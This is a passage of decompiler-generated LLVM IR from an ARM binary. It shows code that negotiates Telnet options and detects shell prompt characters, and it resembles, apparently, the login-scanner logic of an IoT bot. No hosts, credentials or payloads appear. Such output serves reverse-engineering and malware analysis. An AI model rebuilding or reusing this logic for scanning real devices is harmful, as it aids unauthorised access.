dec_label_pc_11510:                               ; preds = %dec_label_pc_11670, %bb409, %dec_label_pc_115a4, %dec_label_pc_11508, %dec_label_pc_117b8, %dec_label_pc_11734, %dec_label_pc_116f8, %dec_label_pc_11840
  %v0_11510 = load i32, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11510 = icmp eq i32 %v0_11510, 0
  store i1 %v2_11510, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11510, label %dec_label_pc_10d80.loopexit, label %dec_label_pc_10f20

dec_label_pc_1151c:                               ; preds = %dec_label_pc_10e04
  %v1_1151c = add i32 %v0_10e04, 24
  %v2_1151c = inttoptr i32 %v1_1151c to i32*
  %v3_1151c = load i32, i32* %v2_1151c, align 4
  store i32 %v3_1151c, i32* %r1.global-to-local, align 4
  %v1_11520 = add i32 %v3_1151c, -1
  store i32 %v1_11520, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11524 = icmp eq i32 %v1_11520, 0
  store i1 %v2_11524, i1* %cpsr_z.global-to-local, align 1
  %tmp402 = icmp slt i32 %v1_11520, 1
  br i1 %tmp402, label %dec_label_pc_11588, label %dec_label_pc_1152c

dec_label_pc_1152c:                               ; preds = %dec_label_pc_1151c
  %v2_1152c = add i32 %v1_11520, %v0_10e04
  store i32 %v2_1152c, i32* %r3.global-to-local, align 4
  %v1_11530 = add i32 %v2_1152c, 28
  %v2_11530 = inttoptr i32 %v1_11530 to i8*
  %v3_11530 = load i8, i8* %v2_11530, align 1
  %v4_11530 = zext i8 %v3_11530 to i32
  store i32 %v4_11530, i32* %r3.global-to-local, align 4
  %v2_11534 = icmp ugt i8 %v3_11530, 61
  store i1 %v2_11534, i1* %cpsr_c.global-to-local, align 1
  %v7_11534 = icmp eq i8 %v3_11530, 62
  store i1 %v7_11534, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11534, label %dec_label_pc_11730, label %bb403

bb403:                                            ; preds = %dec_label_pc_1152c
  %v3_11538 = icmp ugt i8 %v3_11530, 57
  store i1 %v3_11538, i1* %cpsr_c.global-to-local, align 1
  %v8_11538 = icmp eq i8 %v3_11530, 58
  store i1 %v8_11538, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11538, label %dec_label_pc_11730, label %dec_label_pc_11540

dec_label_pc_11540:                               ; preds = %bb403
  %v2_11540 = icmp ugt i8 %v3_11530, 35
  store i1 %v2_11540, i1* %cpsr_c.global-to-local, align 1
  %v7_11540 = icmp eq i8 %v3_11530, 36
  store i1 %v7_11540, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11540, label %dec_label_pc_11730, label %dec_label_pc_11548

dec_label_pc_11548:                               ; preds = %dec_label_pc_11540
  %v2_11548 = icmp ugt i8 %v3_11530, 34
  store i1 %v2_11548, i1* %cpsr_c.global-to-local, align 1
  %v7_11548 = icmp eq i8 %v3_11530, 35
  store i1 %v7_11548, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11548, label %dec_label_pc_11730, label %dec_label_pc_11580.preheader

dec_label_pc_11580.preheader:                     ; preds = %dec_label_pc_11548
  %v3_1154c = add i32 %v0_10e04, 28
  %v2_11550 = add i32 %v3_1154c, %v3_1151c
  store i32 %v2_11550, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11580

dec_label_pc_1155c:                               ; preds = %dec_label_pc_11580
  %v1_1155c = add i32 %v0_11578, -2
  %v2_1155c = inttoptr i32 %v1_1155c to i8*
  %v3_1155c = load i8, i8* %v2_1155c, align 1
  %v4_1155c = zext i8 %v3_1155c to i32
  store i32 %v4_1155c, i32* %r2.global-to-local, align 4
  %v2_11560 = icmp ugt i8 %v3_1155c, 61
  store i1 %v2_11560, i1* %cpsr_c.global-to-local, align 1
  %v7_11560 = icmp eq i8 %v3_1155c, 62
  store i1 %v7_11560, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11560, label %dec_label_pc_11730, label %bb404

bb404:                                            ; preds = %dec_label_pc_1155c
  %v3_11564 = icmp ugt i8 %v3_1155c, 57
  store i1 %v3_11564, i1* %cpsr_c.global-to-local, align 1
  %v8_11564 = icmp eq i8 %v3_1155c, 58
  store i1 %v8_11564, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11564, label %dec_label_pc_11730, label %dec_label_pc_1156c

dec_label_pc_1156c:                               ; preds = %bb404
  %v2_1156c = icmp ugt i8 %v3_1155c, 35
  store i1 %v2_1156c, i1* %cpsr_c.global-to-local, align 1
  %v7_1156c = icmp eq i8 %v3_1155c, 36
  store i1 %v7_1156c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1156c, label %dec_label_pc_11730, label %dec_label_pc_11574

dec_label_pc_11574:                               ; preds = %dec_label_pc_1156c
  %v2_11574 = icmp ugt i8 %v3_1155c, 34
  store i1 %v2_11574, i1* %cpsr_c.global-to-local, align 1
  %v7_11574 = icmp eq i8 %v3_1155c, 35
  store i1 %v7_11574, i1* %cpsr_z.global-to-local, align 1
  %v1_11578 = add i32 %v0_11578, -1
  store i32 %v1_11578, i32* %r3.global-to-local, align 4
  br i1 %v7_11574, label %dec_label_pc_11730, label %dec_label_pc_11580

dec_label_pc_11580:                               ; preds = %dec_label_pc_11580.preheader, %dec_label_pc_11574
  %v0_11578 = phi i32 [ %v2_11550, %dec_label_pc_11580.preheader ], [ %v1_11578, %dec_label_pc_11574 ]
  %v0_11580 = phi i32 [ %v1_11520, %dec_label_pc_11580.preheader ], [ %v1_11580, %dec_label_pc_11574 ]
  %v1_11580 = add i32 %v0_11580, -1
  store i32 %v1_11580, i32* %r0.global-to-local, align 4
  %v2_11580 = icmp ne i32 %v0_11580, 0
  store i1 %v2_11580, i1* %cpsr_c.global-to-local, align 1
  %v7_11580 = icmp eq i32 %v0_11580, 1
  store i1 %v7_11580, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11580, label %dec_label_pc_11588, label %dec_label_pc_1155c

dec_label_pc_11588:                               ; preds = %dec_label_pc_11580, %dec_label_pc_1151c
  %v0_11588 = load i32, i32* @fp, align 4
  store i32 %v0_11588, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_187a8.317 to i32), i32* %r2.global-to-local, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v5_11594 = call i32 @function_12538(i32 %v0_11588, i32 %v3_1151c, i32 ptrtoint ([8 x i8]* @global_var_187a8.317 to i32), i32 7)
  store i32 %v5_11594, i32* %r0.global-to-local, align 4
  %v2_11598 = icmp eq i32 %v5_11594, -1
  store i1 %v2_11598, i1* %cpsr_c.global-to-local, align 1
  %v7_11598 = icmp eq i32 %v5_11594, -1
  store i1 %v7_11598, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_11594, i32* @r8, align 4
  br i1 %v7_11598, label %dec_label_pc_10d80.loopexit, label %dec_label_pc_115a4

dec_label_pc_115a4:                               ; preds = %dec_label_pc_11588
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_115a4 = icmp eq i32 %v5_11594, 0
  store i1 %v2_115a4, i1* %cpsr_z.global-to-local, align 1
  %tmp405 = icmp slt i32 %v5_11594, 1
  br i1 %tmp405, label %dec_label_pc_11510, label %dec_label_pc_115a4.dec_label_pc_11734_crit_edge

dec_label_pc_115a4.dec_label_pc_11734_crit_edge:  ; preds = %dec_label_pc_115a4
  %v0_11734.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_11734

dec_label_pc_115b0:                               ; preds = %dec_label_pc_10e04
  %v1_115b0 = add i32 %v0_10e04, 24
  %v2_115b0 = inttoptr i32 %v1_115b0 to i32*
  %v3_115b0 = load i32, i32* %v2_115b0, align 4
  store i32 %v3_115b0, i32* %r2.global-to-local, align 4
  %v0_115b4 = load i32, i32* @fp, align 4
  store i32 %v0_115b4, i32* @r4, align 4
  store i32 0, i32* @r8, align 4
  %v3_115bc139 = icmp eq i32 %v3_115b0, 0
  store i1 %v3_115bc139, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_115bc139, i1* %cpsr_z.global-to-local, align 1
  %v6_115c0146 = icmp sgt i32 %v3_115b0, 0
  br i1 %v6_115c0146, label %dec_label_pc_115c4.preheader, label %dec_label_pc_11670

dec_label_pc_115bc.loopexit:                      ; preds = %dec_label_pc_115e0
  %v2_115e8 = add i32 %v1_115e8, 2
  store i32 %v2_115e8, i32* @r4, align 4
  %v2_115ec = add i32 %v1_115ec, 2
  store i32 %v2_115ec, i32* @r8, align 4
  %v3_115bc = icmp uge i32 %v2_115ec, %v1_115bc
  store i1 %v3_115bc, i1* %cpsr_c.global-to-local, align 1
  %v9_115bc = icmp eq i32 %v2_115ec, %v1_115bc
  store i1 %v9_115bc, i1* %cpsr_z.global-to-local, align 1
  %v6_115c0 = icmp slt i32 %v2_115ec, %v1_115bc
  br i1 %v6_115c0, label %dec_label_pc_115c4.preheader, label %dec_label_pc_11670

dec_label_pc_115c4.preheader:                     ; preds = %dec_label_pc_115b0, %dec_label_pc_115bc.loopexit
  %v6_11678223 = phi i32 [ %v6_11678224, %dec_label_pc_115bc.loopexit ], [ %v0_10e04, %dec_label_pc_115b0 ]
  %v1_115ec212 = phi i32 [ %v2_115ec, %dec_label_pc_115bc.loopexit ], [ 0, %dec_label_pc_115b0 ]
  %v1_115d0210 = phi i32 [ %v1_115bc, %dec_label_pc_115bc.loopexit ], [ %v3_115b0, %dec_label_pc_115b0 ]
  %v0_115c4208 = phi i32 [ %v2_115e8, %dec_label_pc_115bc.loopexit ], [ %v0_115b4, %dec_label_pc_115b0 ]
  br label %dec_label_pc_115c4

dec_label_pc_115c4:                               ; preds = %dec_label_pc_115c4.preheader, %dec_label_pc_11654
  %v6_11678224 = phi i32 [ %v6_11678223, %dec_label_pc_115c4.preheader ], [ %v0_1165c, %dec_label_pc_11654 ]
  %v1_115ec = phi i32 [ %v1_115ec212, %dec_label_pc_115c4.preheader ], [ %v1_11660, %dec_label_pc_11654 ]
  %v1_115bc = phi i32 [ %v1_115d0210, %dec_label_pc_115c4.preheader ], [ %v3_1165c, %dec_label_pc_11654 ]
  %v1_115e8 = phi i32 [ %v0_115c4208, %dec_label_pc_115c4.preheader ], [ %v1_11668, %dec_label_pc_11654 ]
  %v1_115c4 = inttoptr i32 %v1_115e8 to i8*
  %v2_115c4 = load i8, i8* %v1_115c4, align 1
  %v3_115c4 = zext i8 %v2_115c4 to i32
  store i32 %v3_115c4, i32* @r3, align 4
  %v2_115c8 = icmp eq i8 %v2_115c4, -1
  store i1 %v2_115c8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_115c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_115c8, label %dec_label_pc_115d0, label %dec_label_pc_11670

dec_label_pc_115d0:                               ; preds = %dec_label_pc_115c4
  %v0_115d0 = load i32, i32* @fp, align 4
  %v2_115d0 = add i32 %v0_115d0, %v1_115bc
  store i32 %v2_115d0, i32* %r1.global-to-local, align 4
  %v1_115d4 = add i32 %v1_115e8, 1
  store i32 %v1_115d4, i32* @r5, align 4
  %v3_115d8 = icmp uge i32 %v2_115d0, %v1_115d4
  store i1 %v3_115d8, i1* %cpsr_c.global-to-local, align 1
  %v9_115d8 = icmp eq i32 %v2_115d0, %v1_115d4
  store i1 %v9_115d8, i1* %cpsr_z.global-to-local, align 1
  %v2_115dc = xor i1 %v3_115d8, true
  %v3_115dc = or i1 %v9_115d8, %v2_115dc
  br i1 %v3_115dc, label %dec_label_pc_11670, label %dec_label_pc_115e0

dec_label_pc_115e0:                               ; preds = %dec_label_pc_115d0
  %v2_115e0 = inttoptr i32 %v1_115d4 to i8*
  %v3_115e0 = load i8, i8* %v2_115e0, align 1
  %v4_115e0 = zext i8 %v3_115e0 to i32
  store i32 %v4_115e0, i32* @r3, align 4
  %v2_115e4 = icmp eq i8 %v3_115e0, -1
  store i1 %v2_115e4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_115e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_115e4, label %dec_label_pc_115bc.loopexit, label %dec_label_pc_115f4

dec_label_pc_115f4:                               ; preds = %dec_label_pc_115e0
  %v2_115f4 = icmp ugt i8 %v3_115e0, -4
  store i1 %v2_115f4, i1* %cpsr_c.global-to-local, align 1
  %v7_115f4 = icmp eq i8 %v3_115e0, -3
  store i1 %v7_115f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_115f4, label %dec_label_pc_11680, label %dec_label_pc_115fc

dec_label_pc_115fc:                               ; preds = %dec_label_pc_115f4
  %v1_115fc = add i32 %v1_115e8, 2
  store i32 %v1_115fc, i32* @r3, align 4
  %v3_11600 = icmp uge i32 %v2_115d0, %v1_115fc
  store i1 %v3_11600, i1* %cpsr_c.global-to-local, align 1
  %v9_11600 = icmp eq i32 %v2_115d0, %v1_115fc
  store i1 %v9_11600, i1* %cpsr_z.global-to-local, align 1
  %v2_11604 = xor i1 %v3_11600, true
  %v3_11604 = or i1 %v9_11600, %v2_11604
  br i1 %v3_11604, label %dec_label_pc_11670, label %dec_label_pc_11608

dec_label_pc_11608:                               ; preds = %dec_label_pc_116e4, %bb410, %.thread109, %dec_label_pc_115fc
  %v0_11608 = load i32, i32* @r5, align 4
  %v1_11608 = inttoptr i32 %v0_11608 to i8*
  %v2_11608 = load i8, i8* %v1_11608, align 1
  %v3_11608 = zext i8 %v2_11608 to i32
  store i32 %v3_11608, i32* %r3.global-to-local, align 4
  %v2_1160c = icmp ugt i8 %v2_11608, -4
  store i1 %v2_1160c, i1* %cpsr_c.global-to-local, align 1
  %v7_1160c = icmp eq i8 %v2_11608, -3
  store i1 %v7_1160c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1160c, label %.thread101, label %dec_label_pc_1161c

.thread101:                                       ; preds = %dec_label_pc_11608
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_11608, align 1
  %v0_11618.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11618.pr.pr, label %.thread104, label %.thread101.dec_label_pc_1161cthread-pre-split_crit_edge

.thread101.dec_label_pc_1161cthread-pre-split_crit_edge: ; preds = %.thread101
  %v0_1161c.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1161c

dec_label_pc_1161c:                               ; preds = %dec_label_pc_11608, %.thread101.dec_label_pc_1161cthread-pre-split_crit_edge
  %v0_1161c.pr = phi i32 [ %v0_1161c.pr.pre, %.thread101.dec_label_pc_1161cthread-pre-split_crit_edge ], [ %v3_11608, %dec_label_pc_11608 ]
  %v2_1161c = icmp ugt i32 %v0_1161c.pr, 250
  store i1 %v2_1161c, i1* %cpsr_c.global-to-local, align 1
  %v7_1161c = icmp eq i32 %v0_1161c.pr, 251
  store i1 %v7_1161c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1161c, label %bb406, label %.thread104

bb406:                                            ; preds = %dec_label_pc_1161c
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_11624 = load i32, i32* @r5, align 4
  %v4_11624 = inttoptr i32 %v3_11624 to i8*
  store i8 -3, i8* %v4_11624, align 1
  br label %.thread104

.thread104:                                       ; preds = %dec_label_pc_1161c, %.thread101, %bb406
  %v0_11628 = load i32, i32* @r4, align 4
  %v1_11628 = add i32 %v0_11628, 2
  %v2_11628 = inttoptr i32 %v1_11628 to i8*
  %v3_11628 = load i8, i8* %v2_11628, align 1
  %v4_11628 = zext i8 %v3_11628 to i32
  store i32 %v4_11628, i32* %r3.global-to-local, align 4
  %v2_1162c = icmp ugt i8 %v3_11628, -4
  store i1 %v2_1162c, i1* %cpsr_c.global-to-local, align 1
  %v7_1162c = icmp eq i8 %v3_11628, -3
  store i1 %v7_1162c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1162c, label %.thread105, label %dec_label_pc_1163c

.thread105:                                       ; preds = %.thread104
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v2_11628, align 1
  %v0_11638.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11638.pr.pr, label %.thread108, label %.thread105.dec_label_pc_1163cthread-pre-split_crit_edge

.thread105.dec_label_pc_1163cthread-pre-split_crit_edge: ; preds = %.thread105
  %v0_1163c.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1163c

dec_label_pc_1163c:                               ; preds = %.thread104, %.thread105.dec_label_pc_1163cthread-pre-split_crit_edge
  %v0_1163c.pr = phi i32 [ %v0_1163c.pr.pre, %.thread105.dec_label_pc_1163cthread-pre-split_crit_edge ], [ %v4_11628, %.thread104 ]
  %v2_1163c = icmp ugt i32 %v0_1163c.pr, 250
  store i1 %v2_1163c, i1* %cpsr_c.global-to-local, align 1
  %v7_1163c = icmp eq i32 %v0_1163c.pr, 251
  store i1 %v7_1163c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1163c, label %bb407, label %.thread108

bb407:                                            ; preds = %dec_label_pc_1163c
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_11644 = load i32, i32* @r4, align 4
  %v4_11644 = add i32 %v3_11644, 2
  %v5_11644 = inttoptr i32 %v4_11644 to i8*
  store i8 -3, i8* %v5_11644, align 1
  br label %.thread108

.thread108:                                       ; preds = %dec_label_pc_1163c, %.thread105, %bb407
  %v0_11648 = load i32, i32* @r6, align 4
  %v1_11648 = add i32 %v0_11648, 4
  %v2_11648 = inttoptr i32 %v1_11648 to i32*
  %v3_11648 = load i32, i32* %v2_11648, align 4
  store i32 %v3_11648, i32* %r0.global-to-local, align 4
  %v0_1164c = load i32, i32* @r4, align 4
  br label %dec_label_pc_11654

dec_label_pc_11654:                               ; preds = %dec_label_pc_11880, %.thread108
  %v0_11658 = phi i32 [ %v3_11894, %dec_label_pc_11880 ], [ %v3_11648, %.thread108 ]
  %storemerge2 = phi i32 [ %v2_11698, %dec_label_pc_11880 ], [ %v0_1164c, %.thread108 ]
  %storemerge = phi i32 [ 9, %dec_label_pc_11880 ], [ 3, %.thread108 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 16384, i32* @r3, align 4
  %v4_11658 = call i32 @function_13884(i32 %v0_11658, i32 %storemerge2, i32 %storemerge, i32 16384)
  store i32 %v4_11658, i32* %r0.global-to-local, align 4
  %v0_1165c = load i32, i32* @r6, align 4
  %v1_1165c = add i32 %v0_1165c, 24
  %v2_1165c = inttoptr i32 %v1_1165c to i32*
  %v3_1165c = load i32, i32* %v2_1165c, align 4
  store i32 %v3_1165c, i32* %r2.global-to-local, align 4
  %v0_11660 = load i32, i32* @r8, align 4
  %v1_11660 = add i32 %v0_11660, 3
  store i32 %v1_11660, i32* @r8, align 4
  %v3_11664 = icmp uge i32 %v1_11660, %v3_1165c
  store i1 %v3_11664, i1* %cpsr_c.global-to-local, align 1
  %v9_11664 = icmp eq i32 %v1_11660, %v3_1165c
  store i1 %v9_11664, i1* %cpsr_z.global-to-local, align 1
  %v0_11668 = load i32, i32* @r4, align 4
  %v1_11668 = add i32 %v0_11668, 3
  store i32 %v1_11668, i32* @r4, align 4
  %v5_1166c = icmp slt i32 %v1_11660, %v3_1165c
  br i1 %v5_1166c, label %dec_label_pc_115c4, label %dec_label_pc_11670

dec_label_pc_11670:                               ; preds = %dec_label_pc_115bc.loopexit, %dec_label_pc_115c4, %dec_label_pc_11654, %dec_label_pc_115fc, %dec_label_pc_115d0, %dec_label_pc_115b0, %dec_label_pc_11680.dec_label_pc_11670.loopexit_crit_edge
  %v6_11678 = phi i32 [ %v0_116b0, %dec_label_pc_11680.dec_label_pc_11670.loopexit_crit_edge ], [ %v0_10e04, %dec_label_pc_115b0 ], [ %v6_11678224, %dec_label_pc_115c4 ], [ %v0_1165c, %dec_label_pc_11654 ], [ %v6_11678224, %dec_label_pc_115fc ], [ %v6_11678224, %dec_label_pc_115d0 ], [ %v6_11678224, %dec_label_pc_115bc.loopexit ]
  %v0_11670 = phi i32 [ %v0_11670.pre.pre, %dec_label_pc_11680.dec_label_pc_11670.loopexit_crit_edge ], [ 0, %dec_label_pc_115b0 ], [ %v1_115ec, %dec_label_pc_115c4 ], [ %v1_11660, %dec_label_pc_11654 ], [ %v1_115ec, %dec_label_pc_115fc ], [ %v1_115ec, %dec_label_pc_115d0 ], [ %v2_115ec, %dec_label_pc_115bc.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11670 = icmp eq i32 %v0_11670, 0
  store i1 %v2_11670, i1* %cpsr_z.global-to-local, align 1
  %tmp408 = icmp slt i32 %v0_11670, 1
  br i1 %tmp408, label %dec_label_pc_11510, label %bb409

bb409:                                            ; preds = %dec_label_pc_11670
  store i32 3, i32* @r3, align 4
  %v7_11678 = add i32 %v6_11678, 12
  %v8_11678 = inttoptr i32 %v7_11678 to i32*
  store i32 3, i32* %v8_11678, align 4
  br label %dec_label_pc_11510

dec_label_pc_11680:                               ; preds = %dec_label_pc_115f4
  store i32 %v2_11684, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_187b9.319 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_11684, i32* @r0, align 4
  %v0_1169c = call i32 @function_13680()
  store i32 9, i32* @r2, align 4
  store i32 %v2_11698, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_187b0.321 to i32), i32* @r1, align 4
  %v0_116ac = call i32 @function_13680()
  store i32 %v0_116ac, i32* %r0.global-to-local, align 4
  %v0_116b0 = load i32, i32* @r6, align 4
  %v1_116b0 = add i32 %v0_116b0, 24
  %v2_116b0 = inttoptr i32 %v1_116b0 to i32*
  %v3_116b0 = load i32, i32* %v2_116b0, align 4
  %v0_116b4 = load i32, i32* @r4, align 4
  %v1_116b4 = add i32 %v0_116b4, 2
  store i32 %v1_116b4, i32* %r2.global-to-local, align 4
  %v0_116b8 = load i32, i32* @fp, align 4
  %v2_116b8 = add i32 %v0_116b8, %v3_116b0
  store i32 %v2_116b8, i32* @r3, align 4
  %v3_116bc = icmp uge i32 %v2_116b8, %v1_116b4
  store i1 %v3_116bc, i1* %cpsr_c.global-to-local, align 1
  %v9_116bc = icmp eq i32 %v2_116b8, %v1_116b4
  store i1 %v9_116bc, i1* %cpsr_z.global-to-local, align 1
  %v2_116c0 = xor i1 %v3_116bc, true
  %v3_116c0 = or i1 %v9_116bc, %v2_116c0
  br i1 %v3_116c0, label %dec_label_pc_11680.dec_label_pc_11670.loopexit_crit_edge, label %dec_label_pc_116c4

dec_label_pc_11680.dec_label_pc_11670.loopexit_crit_edge: ; preds = %dec_label_pc_11680
  %v0_11670.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_11670

dec_label_pc_116c4:                               ; preds = %dec_label_pc_11680
  %v2_116c4 = inttoptr i32 %v1_116b4 to i8*
  %v3_116c4 = load i8, i8* %v2_116c4, align 1
  %v4_116c4 = zext i8 %v3_116c4 to i32
  store i32 %v4_116c4, i32* %r3.global-to-local, align 4
  %v2_116c8 = icmp ugt i8 %v3_116c4, 30
  store i1 %v2_116c8, i1* %cpsr_c.global-to-local, align 1
  %v7_116c8 = icmp eq i8 %v3_116c4, 31
  store i1 %v7_116c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_116c8, label %dec_label_pc_11880, label %dec_label_pc_116d0

dec_label_pc_116d0:                               ; preds = %dec_label_pc_116c4
  %v1_116d0 = inttoptr i32 %v0_116b4 to i8*
  %v2_116d0 = load i8, i8* %v1_116d0, align 1
  %v3_116d0 = zext i8 %v2_116d0 to i32
  store i32 %v3_116d0, i32* %r3.global-to-local, align 4
  %v2_116d4 = icmp ugt i8 %v2_116d0, -4
  store i1 %v2_116d4, i1* %cpsr_c.global-to-local, align 1
  %v7_116d4 = icmp eq i8 %v2_116d0, -3
  store i1 %v7_116d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_116d4, label %.thread109, label %dec_label_pc_116e4

.thread109:                                       ; preds = %dec_label_pc_116d0
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_116d0, align 1
  %v0_116e0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_116e0.pr.pr, label %dec_label_pc_11608, label %.thread109.dec_label_pc_116e4thread-pre-split_crit_edge

.thread109.dec_label_pc_116e4thread-pre-split_crit_edge: ; preds = %.thread109
  %v0_116e4.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_116e4

dec_label_pc_116e4:                               ; preds = %dec_label_pc_116d0, %.thread109.dec_label_pc_116e4thread-pre-split_crit_edge
  %v0_116e4.pr = phi i32 [ %v0_116e4.pr.pre, %.thread109.dec_label_pc_116e4thread-pre-split_crit_edge ], [ %v3_116d0, %dec_label_pc_116d0 ]
  %v2_116e4 = icmp ugt i32 %v0_116e4.pr, 250
  store i1 %v2_116e4, i1* %cpsr_c.global-to-local, align 1
  %v7_116e4 = icmp eq i32 %v0_116e4.pr, 251
  store i1 %v7_116e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_116e4, label %bb410, label %dec_label_pc_11608

bb410:                                            ; preds = %dec_label_pc_116e4
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_116ec = load i32, i32* @r4, align 4
  %v4_116ec = inttoptr i32 %v3_116ec to i8*
  store i8 -3, i8* %v4_116ec, align 1
  br label %dec_label_pc_11608

dec_label_pc_116f4:                               ; preds = %dec_label_pc_114b8, %dec_label_pc_114d8, %dec_label_pc_114d0, %dec_label_pc_114c8, %bb401, %dec_label_pc_114a4, %dec_label_pc_11480, %dec_label_pc_1149c, %dec_label_pc_11494, %bb400
  %v0_116f4 = phi i32 [ %v1_11474, %dec_label_pc_114a4 ], [ %v1_11474, %dec_label_pc_11480 ], [ %v1_11474, %dec_label_pc_1149c ], [ %v1_11474, %dec_label_pc_11494 ], [ %v1_11474, %bb400 ], [ %v1_114e4, %bb401 ], [ %v1_114e4, %dec_label_pc_114c8 ], [ %v1_114e4, %dec_label_pc_114d0 ], [ %v1_114e4, %dec_label_pc_114d8 ], [ %v1_114e4, %dec_label_pc_114b8 ]
  %v1_116f4 = add i32 %v0_116f4, 1
  store i32 %v1_116f4, i32* @r8, align 4
  br label %dec_label_pc_116f8

dec_label_pc_116f8:                               ; preds = %dec_label_pc_11508.dec_label_pc_116f8_crit_edge, %dec_label_pc_116f4
  %v0_116f8 = phi i32 [ %v0_116f8.pre, %dec_label_pc_11508.dec_label_pc_116f8_crit_edge ], [ %v0_10e04, %dec_label_pc_116f4 ]
  %v1_116f8 = inttoptr i32 %v0_116f8 to i32*
  %v2_116f8 = load i32, i32* %v1_116f8, align 4
  store i32 %v2_116f8, i32* %r3.global-to-local, align 4
  %v1_116fc = add i32 %v0_116f8, 4
  %v2_116fc = inttoptr i32 %v1_116fc to i32*
  %v3_116fc = load i32, i32* %v2_116fc, align 4
  store i32 %v3_116fc, i32* %r0.global-to-local, align 4
  %v1_11700 = add i32 %v2_116f8, 12
  %v2_11700 = inttoptr i32 %v1_11700 to i8*
  %v3_11700 = load i8, i8* %v2_11700, align 1
  %v4_11700 = zext i8 %v3_11700 to i32
  store i32 %v4_11700, i32* %r2.global-to-local, align 4
  %v1_11704 = inttoptr i32 %v2_116f8 to i32*
  %v2_11704 = load i32, i32* %v1_11704, align 4
  store i32 %v2_11704, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_1170c = call i32 @function_13884(i32 %v3_116fc, i32 %v2_11704, i32 %v4_11700, i32 16384)
  store i32 %v4_1170c, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11714 = load i32, i32* @r6, align 4
  %v1_11714 = add i32 %v0_11714, 4
  %v2_11714 = inttoptr i32 %v1_11714 to i32*
  %v3_11714 = load i32, i32* %v2_11714, align 4
  store i32 %v3_11714, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_11720 = call i32 @function_13884(i32 %v3_11714, i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32 2, i32 16384)
  store i32 %v4_11720, i32* %r0.global-to-local, align 4
  store i32 4, i32* @r3, align 4
  %v1_11728 = load i32, i32* @r6, align 4
  %v2_11728 = add i32 %v1_11728, 12
  %v3_11728 = inttoptr i32 %v2_11728 to i32*
  store i32 4, i32* %v3_11728, align 4
  br label %dec_label_pc_11510

dec_label_pc_11730:                               ; preds = %dec_label_pc_1155c, %dec_label_pc_11574, %dec_label_pc_1156c, %bb404, %dec_label_pc_11548, %dec_label_pc_1152c, %dec_label_pc_11540, %bb403
  %v0_11730 = phi i32 [ %v1_11520, %dec_label_pc_11548 ], [ %v1_11520, %dec_label_pc_1152c ], [ %v1_11520, %dec_label_pc_11540 ], [ %v1_11520, %bb403 ], [ %v1_11580, %bb404 ], [ %v1_11580, %dec_label_pc_1156c ], [ %v1_11580, %dec_label_pc_11574 ], [ %v1_11580, %dec_label_pc_1155c ]
  %v1_11730 = add i32 %v0_11730, 1
  store i32 %v1_11730, i32* @r8, align 4
  br label %dec_label_pc_11734

dec_label_pc_11734:                               ; preds = %dec_label_pc_115a4.dec_label_pc_11734_crit_edge, %dec_label_pc_11730
  %v0_11734 = phi i32 [ %v0_11734.pre, %dec_label_pc_115a4.dec_label_pc_11734_crit_edge ], [ %v0_10e04, %dec_label_pc_11730 ]
  %v1_11734 = inttoptr i32 %v0_11734 to i32*
  %v2_11734 = load i32, i32* %v1_11734, align 4
  store i32 %v2_11734, i32* %r3.global-to-local, align 4
